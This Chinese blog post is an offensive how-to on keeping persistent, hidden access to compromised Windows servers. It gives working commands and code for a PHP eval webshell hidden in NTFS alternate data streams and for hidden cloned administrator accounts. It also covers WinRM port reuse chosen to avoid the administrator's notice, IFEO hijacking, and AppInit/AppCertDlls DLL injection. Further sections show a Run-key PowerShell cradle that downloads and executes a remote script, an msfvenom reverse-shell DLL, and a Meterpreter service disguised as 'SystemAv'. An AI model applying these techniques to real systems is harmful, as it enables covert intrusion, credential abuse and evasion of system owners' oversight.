---
author: Noel
pubDatetime: 2022-07-03T23:42:31.000+08:00
modDatetime: 2022-07-03T23:42:31.000+08:00
title: Windows 权限维持常见方法
featured: false
draft: false
tags:
  - Redteam
  - 网络安全
  - Windows
description: 
   像我这样的菜鸡在进行日站的过程中，基本上遇到的都是云服务器，这也意味着大多数情况下我不需要进行内网渗透。那么这时候 权限维持 和 痕迹清理 也就显得较为常用和重要了.这篇文章主要记录关于 权限维持 相关的知识.
---


# 前言

像我这样的菜鸡在进行日站的过程中，基本上遇到的都是云服务器，这也意味着大多数情况下我不需要进行内网渗透。那么这时候 `权限维持` 和 `痕迹清理` 也就显得较为常用和重要了.

这篇文章主要记录关于 `权限维持` 相关的知识.

> 本文主要记录权限维持相关的知识, 关于如何绕 查杀及杀软不在记录范围内,所以不会做相关详细记录.

> 本文对标的操作系统为 `Windows 系列`.

# 正文

## 基础篇之文件隐藏

`设置文件隐藏属性`

大多数情况下,我们获取 `webshell` 的方法都是通过文件上传. 关于文件, 最直接的隐藏方法就是对文件添加隐藏属性.

![20220620163639](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cef4654e79b60d2e404949ff0c6dc4da9.png)

你也可以使用 `cmd` 命令进行操作从而达到同样的目的.
```
ATTRIB +h fileName
```

如果用户稍微了解一下隐藏文件的查看方式,这种隐藏文件很容易被发现.
![20220620164125](http://particles.oss-cn-beijing.aliyuncs.com/img%5C5bb70d8e5dad35d2e051f60fefb92de8.png)

这时你可以为文件添加额外的属性来达到简单的绕过
```
ATTRIB +h +a +s +r 1.txt
```
这样即使用户在 `查看` 设置中开启了 `查看隐藏项目` 的选项,但是还是无法看到隐藏文件. 不过这两种方式都没法逃掉使用 `cmd` 命令查看隐藏文件的方式
```
dir /a:h
```
![20220620164958](http://particles.oss-cn-beijing.aliyuncs.com/img%5C57bb14c317679c4735cffac9cd5f43b2.png)

`通过ADS流文件来隐藏文件`

什么是 `ADS流文件`
> NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。

其实在文件上传处已经已经提到过一次
> 在 Window系统 中,如果文件名 + "::\$DATA" 会把 ::\$DATA 之后的数据当成文件流处理,不会检测后缀名，且保持 ::$DATA 之前的文件名，他的目的就是不检查后缀名.

不过这里要做的不是绕过后缀,而是使文件隐藏.

假设目标服务器上已经存在一个 `index.php`. 我们可以通过一下命令添加一个数据流文件
```
echo "<?php eval($_POST['a']);?>" >>index.php:1.txt
```
![20220620170639](http://particles.oss-cn-beijing.aliyuncs.com/img%5C856f91f7fc2b2022a9bb9ea2d0d830a4.png)
通过截图结果我们看到目标目录中并不存在一个叫 `index.php:1.txt` 的文件,但是通过 `dir /r` 命令可以看到确实是存在这个文件的. 那我们追加一句话木马在里面的吗? 我们用 `notepad index.php:1.txt`查看一下这个流文件.

![20220620171206](http://particles.oss-cn-beijing.aliyuncs.com/img%5C7879c87e60a74a86bfff5938848abd86.png)

这下你该相信了吧.
文件既然隐藏了,那要怎么利用呢? 答案是利用 `Php` 的文件包含函数. 举个例子:
```php
<?php
    echo "this is config.php";
    include("index.php:1.txt");
```

![20220620172102](http://particles.oss-cn-beijing.aliyuncs.com/img%5C7188e452e06cf24b07bea1c3802988d2.png)

![20220620172043](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cb116d045ac23de302ff6075c6302f6a1.png)

可以看到这里代码成功执行.

文件流除了能够追加在文件中之外，还能追加到目录中.
```
echo "<?php phpinfo();?>" >>:1.txt
```
![20220620205810](http://particles.oss-cn-beijing.aliyuncs.com/img%5C12f3d8913d86ff928bdba71f960489f8.png)

但是这里我们不能通过 `.:1.txt` 直接获取文件内容
![20220620205841](http://particles.oss-cn-beijing.aliyuncs.com/img%5Ccc8a3ef35b40e830373bc1c2523fd859.png)

这里需要回到上级目录,利用 `上级目录名:1.txt` 才能访问到文件,比如我这里的上级目录名为 `demo`,则我需要返回到上一级目录,通过 `demo:1.txt` 来获取内容.

![20220620210009](http://particles.oss-cn-beijing.aliyuncs.com/img%5C203c2ae1a5e5cc7a1a6965719e3fa02f.png)

同样利用文件包含,也能够完成代码执行.

![20220620210457](http://particles.oss-cn-beijing.aliyuncs.com/img%5C32a7fa94fd3bbb175d48858245f77856.png)

关于如何绕过webshell查杀工具, 有兴趣的师傅可以看看这篇文章.[利用ADS隐藏webshell](https://blog.csdn.net/nzjdsds/article/details/81260524)

> 需要注意的是: 采用文件流的方式  流文件和源文件是互相绑定的. 如第一个例子中 echo "<?php eval($_POST['a']);?>" >>index.php:1.txt ,如果 index.php消失了 那么流文件自动也会消失
> 第二个例子中: 如果 demo 目录消失了 那么对应的 demo:1.txt 也会消失

## 基础篇之影子账户

当我们拿下一台Windows主机时，很多攻击者都会采用创建账号的形式给自己留一个后门，以方便后续登录。这样操作的思路是没有问题的，但这种方式极其容易被用户察觉，比如用户开机以及登录日志里都能查看到。为了更好的隐藏登录账户,这里我们采用 `影子账户`.

影子用户的创建

> 在 windows 环境下创建用户如果后面带了一个"$"符号，在 net user 时默认是不显示的

利用这个特点我们可以创建一个对于 `cmd` 命令来讲的隐藏用户.

![20220621182111](http://particles.oss-cn-beijing.aliyuncs.com/img%5C374ab44cda80bba2533c3497e4f7bc7d.png)

可以看到 `net user ` 的执行结果中并没有我们刚刚创建的用户.但是在重新登陆时还是会显示出我们创建的账户,这显然不是我们希望的.

![20220621182224](http://particles.oss-cn-beijing.aliyuncs.com/img%5C13b34c5f7da4b550f752b3b6958927a6.png)

`克隆账号`

// TODO 克隆账号名词概念补充

接下来操作的目的是为了让用户在命令提示符与管理工具中无法查看到我们添加的账户.

1. 使用 `Windows + r` 输入 `regedit` 打开注册表,找到`HKEY_LOCAL_MACHINE > SAM > SAM`,选中 `SAM` 点击`编辑`中的 `权限`,
将 `Administrators` 的权限改为 `完全控制`.

![20220621183209](http://particles.oss-cn-beijing.aliyuncs.com/img%5C2c0cff7e702bb3aa15c6b657ab482921.png)

2. 按下 `F5` 刷新下注册表,你会发现 `SAM` 下面新增了一些列表. 进入 `SAM > Domain > Account > User > Names`.

![20220621183418](http://particles.oss-cn-beijing.aliyuncs.com/img%5Ca0e17e4dcdd68ba64053c40fa3c2a016.png)

3. 选中 `Administrator` 你会在右边发现一个类型值. 比如我这里是 `0x14`.

![20220621183654](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cdc48da9cc32d0e70f64746f650c0a387.png)

4. 在 `User> `下找到以上诉的`类型值`命名的文件, 右键里面的 `F` 值,复制.

![20220621183723](http://particles.oss-cn-beijing.aliyuncs.com/img%5C4cc5625278eb63441d4774ff825f5cae.png)

5. 再在 `Names>` 下找到你创建用户的的名称,比如我这里是`demo$`,找到对应的类型值, 和 `User>` 下的同名文件的 `F`值,将 `4`
步复制的 `F`值粘贴到里面.
![20220621184753](http://particles.oss-cn-beijing.aliyuncs.com/img%5C878d8a4368e8508f464da13a0330b228.png)

6. 分别导出 第`5`步中的选中的文件夹 和 `Names` 下你创建的用户名.


![20220621184908](http://particles.oss-cn-beijing.aliyuncs.com/img%5C61e512c588e0a8cf0e7ad82da880a247.png)

![20220621184954](http://particles.oss-cn-beijing.aliyuncs.com/img%5C84fbbfccda15fd35343f6a25771d9d0d.png)
7. 删除用户 `net user demo$ /delete`

![20220621185122](http://particles.oss-cn-beijing.aliyuncs.com/img%5Ce6151d06b4ae12ce98a596ed85e57be3.png)

8. 再将刚刚导出的注册表进行导入.
![20220621185236](http://particles.oss-cn-beijing.aliyuncs.com/img%5C9d4668507da8c85617f3d31ff94f5b74.png)

![20220621185258](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cc8a7e438e378e8013f4db9fc5e2c3867.png)

![20220621185320](http://particles.oss-cn-beijing.aliyuncs.com/img%5C68c43612492ec13846bd3fc452a9b58b.png)

导入之后, 影子账户也就创建完成,此时再次使用 `net user` 将不会得到 `demo$` 用户,在 `控制面板` 的 `管理账号` 里也没有额外的用户显示.
![20220621185508](http://particles.oss-cn-beijing.aliyuncs.com/img%5Ce3176623a965c30c4c97dc6df306019f.png)

不过在使用远程桌面又出现了新的问题

![20220621190345](http://particles.oss-cn-beijing.aliyuncs.com/img%5C507434f9f6b57181df59f5971107643a.png)

> 更新出现这个问题的原因是账号没有被启用
> 以管理员启动 cmd  输入  net user demo$ /active:yes 即可
> 不过也同样存在用户没有授权的情况，

~~出现这个问题的原因是因为用户没有被授权.我们手动添加以下权限~~
![20220621190600](http://particles.oss-cn-beijing.aliyuncs.com/img%5C4006cf66966d3729c6750133be4d308f.png)


`踩坑`

1. 执行导入注册表后,账户时默认没有启用的.需要手动激活.
2. 远程登录会将本地账号挤下线.
3. 远程登录账号不下线, 在登陆时还是页面还是会显示隐藏账户名.

解决
问题2和3 应该时由于 `Windows 非服务器系统默认只允许一个账户登录`,解决方案可以参考这边文章.
[渗透技巧-Windows系统远程桌面的多用户登录](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95)

`拓展思路`

如果对方机器的管理用户拥有一定的安全意识,定期 检查注册表的话,那么这种方法还是机器容易被发现.

我们还可以尝试激活目标机器的来宾账户 `Guest` .

## 基础篇之端口复用

端口复用，顾名思义，就是不同的应用程序可以使用相同的端口。

在实际环境中，如果遇到服务器允许指定端口的流量通信，当我们拿下 `webshell` 后,可以考虑采用端口复用的方式进行隐藏 通信,或利用端口复用将3389或22等端口转发到允许通信的端口如80上，以便外部连接.

`原理`

> (1) HTTP.sys
> 
> HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序。
> 
> - 为了优化IIS服务器性能
> - 从IIS6.0引入（即Windows Server 2003及以上版本）
> - IIS服务进程依赖HTTP.sys
> 
> HTTP.sys监听HTTP流量，然后根据URL注册的情况去分发，以实现多个进程在同一个端口监听HTTP流量。微软公开了HTTP Server API库，Httpcfg、Netsh等都是基于它的。
> 整个过程描述如下：
> Step 1.注册：IIS或其他应用使用HTTP Server API时，需要先在HTTP.sys上面注册url prefix，以监听请求路径。
> Step 2.路由：HTTP.sys获取到request请求，并分发这个请求给注册当前url对应的应用。
> 
> (2) Net.tcp Port Sharing
> 
> Net.tcp Port Sharing服务是WCF（Windows Communication Foundation，微软的一个框架）中的一个新系统组件，这个服务会开启Net.tcp端口共享功能以达到在用户的不同进程之间实现端口共享。这个机制的最终是在HTTP.sys中实现的。目前将许多不同HTTP应用程序的流量复用到单个TCP端口上的HTTP.sys模型已经成为windows平台上的标准配置。
> 在以前的web应用中，一个web应用绑定一个端口，若有其他应用则需要绑定其他的端口才能实现监听。
> 现在使用微软提供的NET.tcp Port Sharing服务，只要遵循相关的开发接口规则，就可以实现不同的应用共享相同的web服务器端口。
> 
> (3) WinRM
> 
> WinRM全称是Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM服务能够让管理员远程登录windows操作系统，获得一个类似telnet的交互式命令行shell，而底层通讯协议使用的正是HTTP。
> 事实上，WinRM已经在HTTP.sys上注册了名为wsman的url前缀，默认监听端口5985。因此，在安装了IIS的边界windows服务器上，开启WinRM服务后修改默认listener端口为80或新增一个80端口的listener即可实现端口复用，可以直接通过80端口登录windows服务器。

简单来讲,就是存在三个东西:
1. `HTTP.sys` 可以根据注册的路由进行流量转发
2. `Net.tcp Port Shareing` 一个底层基于 `HTTP.sys` 实现的,能够实现不同进程之间的端口共享的服务.
3. ` WinRM` 用于对本地或远程机器管理的一个终端工具.  它已经在 `HTTP.sys` 上注册好了路由前缀.

因为 `WinRM` 已经实现了路由前缀的注册,现在我们只需要遵循 `Net.tcp Port Shareing`的协议规则,将 `WinRM` 添加到指定端口复用的规则中去就好了.

`相关命令`

查看本机已经注册的路由前缀
```sh
netsh http show servicestate
```

开启 `WinRm` 服务
> Windows 2012及以上：winrm默认启动并监听了5985端口。
> 
> Windows 2008：需要手动启动winrm

```sh
winrm quickconfig ‐q
```

增加端口复用
> 将 winrm 增加到端口服用的规则中

```sh
winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}
```

更改 `WinRM` 的端口,这里将器端口改为 `80`
> 虽然现在 winrm 已经满足端口复用的规则, winrm 默认的复用端口为5985,为了不引起管理员的怀疑,我想将通过80端口访问到目标机器的 winrm 
> 服务,所以这里将 winrm 的端口进行更改.
```
winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}
```

`测试`

这里我依次使用上面的命令,已经创建好了一个 `80` 端口的 `winrm` 端口复用.(虚拟机忘记拍摄快照 导致操作无法回退,过程就不要截图了.)
![20220622162536](http://particles.oss-cn-beijing.aliyuncs.com/img%5C5d114194df3ee07e7864ad35b735c9df.png)

这里使用攻击机,也就是我物理机,使用 `winrm` 去连接远程主机.
同样,首先本机得开启 `winrm` 服务.直接连接远程主机会报错,这时候我们需要设置信任主机地址:
```sh
winrm set winrm/config/Client @{TrustedHosts="*"}
```

之后就可以直接使用账号密码执行命令了.
```sh
winrs -r:http://192.168.112.129 -u:administrator -p:******* whoami

# 你也可以使用 cmd 获取一个交互式的shell
winrs -r:http://192.168.112.129 -u:administrator -p:******* cmd
```

![20220622163329](http://particles.oss-cn-beijing.aliyuncs.com/img%5C8484137f1ed755b17e36b16123e3dd8f.png)

![20220622164125](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cd0d743e75fb266a0a1c6338ebe5a46b4.png)

## 进阶篇之辅助功能镜像劫持

`Windows`提供了一系列辅助功能的软件,以方便部分用户对`Windows`的使用,比如大家熟悉的`粘滞键`.,除了`粘滞键`,其他的辅助工具以及其位置,快捷键为:

```
 C:\Windows\System32\sethc.exe    粘滞键    快捷键：按五次 shift 键
 C:\Windows\System32\utilman.exe     设置中心   快捷键：Windows+U 键
 C:\Windows\System32\osk.exe        屏幕键盘
 C:\Windows\System32\Magnify.exe    放大镜      快捷键：Windows+加减号
```

在早期,类似于`粘滞键`在用户未登陆时通过`按五次shift`就能触发,由于`按五次shift` 执行的` C:\Windows\System32\sethc.exe `这个应用程序,所以聪明的黑客将`cmd.exe`程序复制了一封,并命名为`setch.exe`,将源文件覆盖,所有使用 `五次shift`就能执行`cmd`.这就是所谓的`五次shift`后门了.

> 在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将C:\Windows\System32\ sethc.exe替换为cmd.exe。对于在 Windows Vista 和 Windows Server 2008 及更高的版本中，替换的二进制文件受到了系统的保护，因此这里就需要另一项技术：映像劫持。

> 映像劫持，也被称为「IFEO」（Image File Execution Options）, 是Windows内设的用来调试程序的功能，Windows注册表中存在映像劫持子键(Image File Execution Options)。
>
> 造成映像劫持的罪魁祸首就是参数“Debugger”，它是IFEO里第一个被处理的参数，系统如果发现某个程序文件在IFEO列表中，它就会首先来读取Debugger参数，如果该参数不为空，系统则会把Debugger参数里指定的程序文件名作为用户试图启动的程序执行请求来处理，而仅仅把用户试图启动的程序作为Debugger参数里指定的程序文件名的参数发送过去。

如上提到的注册表为:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
```

![image-20220803173136508](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220803173136508.png)

下面我们来进行测试,为了方便,这里我已劫持放大镜为例:

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe" /t REG_SZ /v Debugger /d "C:\Windows\System32\calc.exe" /f
```

![image-20220803174455334](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220803174455334.png)

创建完成,接下来我们运行放大镜,

成功弹出计算器.

## 进阶篇之进程注入

> 进程注入是一种广泛应用于恶意软件和无文件攻击中的逃避技术，这意味着可以将自定义代码运行在另一个进程的地址空间内。进程注入提高了隐蔽性，也实现了持久化.

### 进程注入之AppCertDlls注册表项

原理:

> 如果有进程使用了CreateProcess、CreateProcessAsUser、CreateProcessWithLoginW、CreateProcessWithTokenW或WinExec函数，那么此进程会获取HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SessionManager\AppCertDlls注册表项，此项下的dll都会加载到此进程。

测试:

使用[代码](https://blog.csdn.net/qq_36374896/article/details/107005578)快速创建 `AppCertDlls` 项:

```cpp
// Project1.exe
#include <iostream> 
#include <Windows.h> 
using namespace std;
 
int test()
{
	DWORD dwDisposition;
	HKEY hKey;
	const char path[] = "C:\\dll.dll";
	RegCreateKeyExA(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
	RegSetValueExA(hKey, "Default", 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));
	return 0;
}
 
int main()
{
	test();
	//system("pause");
	return 0;
}
```

```cpp
// dllmain.cpp : 定义 DLL 应用程序的入口点。
// dll.dll
#include "stdafx.h"
#include "pch.h"
#include <windows.h>
BOOL TestMutex()
{
	HANDLE hMutex = CreateMutexA(NULL, false, "myself");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hMutex);
		return 0;
	}
	return 1;
}
 
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:  //进程创建执行
		if (TestMutex() == 0)
			return TRUE;
		MessageBoxA(0, "hello qianxiao996", "AppCert", 0);
	case DLL_THREAD_ATTACH:  //进=线程创建执行
	case DLL_THREAD_DETACH:  //进程结束执行
 	case DLL_PROCESS_DETACH: //线程结束执行
		break;
	}
	return TRUE;
}
```

> 注意: 这里使用 visual studio 生成解决方案是使用 realse,避免后面运行 exe和加载 dll 时出现杂七杂八的问题.

将生成的 `dll.dll` 放在`c:\dll.dll`,运行 `Project1.exe`,运行后,可以看到新生成`AppCertDlls` 项,并且指定了默认加载的dll文件为`c:\dll.dll`.

![image-20220703135951590](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703135951590.png)



接下来我们使用`CreateProcess` 创建一个进程,代码如下:

```c++
#include <iostream> 
#include <Windows.h> 
using namespace std;

int main()
{
	STARTUPINFO startupInfo = { 0 };
	PROCESS_INFORMATION processInformation = { 0 };

	BOOL bSuccess = CreateProcess(TEXT("C:\Windows\System32\notepad.exe"), NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &startupInfo, &processInformation);

	if (bSuccess)
	{
		cout << "Process started." << endl
			<< "Process ID:\t"
			<< processInformation.dwProcessId << endl;
	}
	else
	{
		cout << "Cannot start process!" << endl
			<< "Error code:\t" << GetLastError() << endl;
	}


	return system("pause");
}
```

双击运行,可以看到成功触发`dll.dll`.

![image-20220703140115498](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703140115498.png)

### 进程注入之AppInit_DLLs注册表项

> User32.dll被加载到进程时，会获取AppInit_DLLs注册表项，若有值，则调用LoadLibrary() [API](https://so.csdn.net/so/search?q=API&spm=1001.2101.3001.7020)加载用户DLL。只会影响加载了user32.dll的进程。
>
> User32.dll是常见的Windows基础库,与Windows用户界面相关的应用程序接口，其主要用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。因此，当恶意软件修改这个子键时，大量进程将加载恶意的DLL.

**测试**

`Appinit_DLLS` 在注册表中的位置为:

```
HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Window\Appinit_Dlls
```

我们先查看下位置的相关信息

![image-20220703113736225](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703113736225.png)

可以看到 `AppInit_DLLs` 的数据值默认为空, `LoadAppInit_DLLs` 的数据值默认为`0`.

这里我借用[网上](https://blog.csdn.net/qq_36374896/article/details/107005590)的一段代码来实现相关注册表的更改操作

> 其实也可以手动更改，不嫌麻烦的话

```c++
// Project1.exe
#include <iostream> 
#include <Windows.h>
using namespace std;
 
int test()
{
	HKEY hKey;
	DWORD dwDisposition;
	const char path[] = "C:\\dll.dll";
	DWORD dwData = 1;
	RegCreateKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition);
	RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path)));
	RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)& dwData, sizeof(DWORD));
	return 0;
}
 
int main()
{
	test();
	//system("pause");
	return 0;
}

```

```cpp
// dllmain.cpp : 定义 DLL 应用程序的入口点。
// dll.dll
#include "stdafx.h"
#include "pch.h"
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    MessageBoxA(0, "hello qianxiao996", "AppCert", 0);
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

将生成的 `dll.dll` 放到 `c:\` 下面,运行 `Project1.exe`, 刷新，再次查看注册表

![image-20220703120306557](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703120306557.png)



可以发现 `AppInit_DLLs` , `LoadAppInit_DLLs` 的数据值都进行了更改.

接下来我们运行 `cmd.exe`,可以看到出现了弹窗,也就成功实现了进程注入.

![image-20220703120436545](https://particles.oss-cn-beijing.aliyuncs.com/img/image-20220703120436545.png)




## 进阶篇之注册表自启动

除了最基本的隐藏外,我们还需要我们的木马处于运行状态,以保证我们随时都能重新恢复对系统的控制权限.

通过在注册表中写入相应的键值可以实现程序的开机自启动.一般自启动项是这两个键：
1. Run

2. RunOnce

两者的区别如下

1. Run：该项下的键值即为开机启动项，每一次随着开机而启动。

2. RunOnce：RunOnce和Run差不多，唯一的区别就是RunOnce的键值只作用一次，执行完毕后就会自动删除

用户级自启动注册表
```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

系统级自启动注册表
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce
```

这里我在用户的注册表中添加了一项启动 `calc.exe`,我在重启机器之后,成功弹出计算器.
![20220622222111](http://particles.oss-cn-beijing.aliyuncs.com/img%5C934d811899b3b5d62766003b77ac59af.png)

![20220622222621](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cca65d0c88ac3fd31bc3f99e113ebea4e.png)

使用以下命令可以一键实现无文件注册表后门：

```shell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Keyname" /t REG_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\"" /f
```
简单说明下上面指令的含义：

为 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` 添加一个值(名称为`Keyname`, 类型为 `REG_SZ`, 值为`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\"`)

`/f` 表示强制覆盖当前现有注册表项.

其中值是使用`powershell` 执行的一段指令, 其含义为:

以不加载用户配置文件、不显示窗口的模式,远程执行`http://192.168.28.142:8888/logo.gif 的ps1`脚本

> 这里其实也算是一个 **strick** 了,使用 cmd 执行 powershell 远程执行powershell脚本时，会忽略 power shell的当前策略,能够直接运行.

## 进阶篇之计划任务

在 Windows 下,存在两种计划任务机制 `schtasks` 和 `at`,这里建议使用 `schtasks`,因为大多数版本已经废弃了 `at` 命令.

![20220622223038](http://particles.oss-cn-beijing.aliyuncs.com/img%5C90d4680bf36512a329b921b9e0d5d6b8.png)

![20220622223158](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cccffc70dd724f8f3f3113e13a22c6942.png)

举个例子:

创建一个名为 `TEST_OnLogon` 的任务, 在每次用户登陆时,出发 `cmd.exe /c calc.exe` 命令:
```sh
schtasks /create /tn "TEST_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
```
这里提一下 `/sc` 参数,

```
/sc 可指定以下参数,他们分别表示.
MINUTE、HOURLY、DAILY、WEEKLY、MONTHLY
指定计划的时间单位。

ONCE
任务在指定的日期和时间运行一次。

ONSTART
任务在每次系统启动的时候运行。可以指定启动的日期，或下一次系统启动的时候运行任务。

ONLOGON
每当用户（任意用户）登录的时候，任务就运行。可以指定日期，或在下次用户登录的时候运行任务。

ONIDLE
只要系统空闲了指定的时间，任务就运行。可以指定日期，或在下次系统空闲的时候运行任务。
```


## 进阶篇之服务自启动

类似于注册表自启动,不同的地方在于此时我们将需要启动的进程设置成为了服务.

![20220622230608](http://particles.oss-cn-beijing.aliyuncs.com/img%5C23096355d3e9bf48b797c3e9ad77d723.png)

举个例子:

创建一个名为 `demo` 的服务, 其启动方式为手动启动, 服务的内容为运行 `cmd.exe /c calc.exe`
```
sc create demo start= demand BinPath= "cmd.exe /c calc.exe"
```
![20220622231455](http://particles.oss-cn-beijing.aliyuncs.com/img%5C337bbd71c50978a4ade0b20b1a07916d.png)

通过启动项可以看到确实增加了一个名为 `demo` 的进程.但是当我们使用 `net start demo` 时却没有弹出计算器. 通过 `任务管理器` 看到确实
增加了一个 `calc.exe` 的进程.

为了确定能够上线,这里我生成一个 `msfshell.exe`,并注册一个服务用来启动他.
从结果可以看到 `net start msf` 的结果报告 `服务没有响应控制功能` ,但我的 `msf` 这边还是建立了 `meterpreter` 会话. 说明没有问题.
![20220622233044](http://particles.oss-cn-beijing.aliyuncs.com/img%5Ccfe1fbd4f0ea0b15ae8e3a8c93c1d008.png)

![20220622233250](http://particles.oss-cn-beijing.aliyuncs.com/img%5C6ec05027decb99d8f3f1f035486cc09a.png)

在通常情况下, 我们可以将 `start= auto` 以实现开机自启动,同时可以还可以使用 `sc description demo "description"` 以及 `sc config demo DisplayName "name"` 来使得我们的服务更加具有迷惑性

举例:

这里我将第二个创建的服务 `msf` 命名为了 `SystemAv`,并为其增加了一个描述`System Anti Anti- Virus`:
```
sc config msf DisplayName "SystemAv"
sc description msf "System Anti Anti- Virus"
```
![20220622234027](http://particles.oss-cn-beijing.aliyuncs.com/img%5C9259f9c1bd9038c7ccd936ec2511a98e.png)


## 进阶篇之VMI后门
// TODO 这玩意网上介绍挺少的，后面补充

## 进阶篇之NetshHelper DLL

原理：

> Netsh.exe（也称为Netshell）是一个命令行脚本实用程序，用于与系统的网络配置进行交互。它包含添加辅助DLL以扩展实用程序功能的功能，使用“netsh add helper”即可注册新的扩展DLL，注册扩展DLL后，在启动Netsh的时候便会加载我们指定的DLL。注册的Netsh Helper DLL的路径会保存到Windows注册表中的HKLM\SOFTWARE\Microsoft\Netsh路径下。但是，此技术的实现需要本地管理员级别的特权。

`实验`

这里我是用 `msfvenom`  生成一段恶意 `DLL文件`.

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.21 LPORT=4444 -f dll > msf.dll
```

> 踩坑 这里在生成 `dll文件` 时如果不指定 x64，在后面进行 `netsh add helper C:\user\Administrator\Destop\msf.dll` 导入时会出现 `下面帮助者dll
> 不能被加载` 的错误. 怀疑可能时因为操作系统时 64位的原因. 暂未测试.
> 

将 `dll` 上传目标机器后执行:

```sh
netsh add helper dll的路径.
```

![20220623134740](http://particles.oss-cn-beijing.aliyuncs.com/img%5Cf1e513c55bfa95c0189ec5ff0dc6b5d5.png)

![20220623134959](http://particles.oss-cn-beijing.aliyuncs.com/img%5C804366a20ef4aa252c5f79063f00d4d0.png)


可以看到在执行之后 `HKLM\SOFTWARE\Microsoft\Netsh` 下新添加了一个键值对. 回头看监听器也成功创建  `meterpreter 会话`

关于如何自启动 `netsh.exe` 可以参考前面的 [注册表自启动](#进阶篇之注册表自启动) ,[服务自启动](#进阶篇之服务自启动) 以及 [计划任务自启动](#进阶篇之计划任务)

## 进阶篇之COM组件劫持

> COM是Component Object Model（组件对象模型）的缩写，COM组件由DLL和EXE形式发布的可执行代码所组成。每个COM组件都有一个CLSID，这个CLSID是注册的时候写进注册表的，可以把这个CLSID理解为这个组件最终可以实例化的子类的一个ID。这样就可以通过查询注册表中的CLSID来找到COM组件所在的dll的名称。所以要想COM劫持，必须精心挑选CLSID，尽量选择应用范围广的CLSID。
>
> CLSID是指Windows系统对于不同的应用程序，文件类型，OLE对象，特殊文件夹以及各种系统组件分配的一个唯一表示它的ID代码，用于对其身份的标识和与其他对象进行区分。
>
> 也就是说CLSID就是对象的身份证号，而当一个应用程序想要调用某个对象时，也是通过CLSID来寻找对象的。

> COM 组件和 注册表之间的关系。这就要说道COM的调用过程了，通常我们编写好一个COM组件，都需要注册到注册表中（也可以设置不用注册的COM组件，但是一般都是使用的注册方法），这样当我调用COM组件的这个功能的时候，程序会进注册表进行读取相应位置的DLL或者EXE，加载到进程还是线程中来，供我们使用。

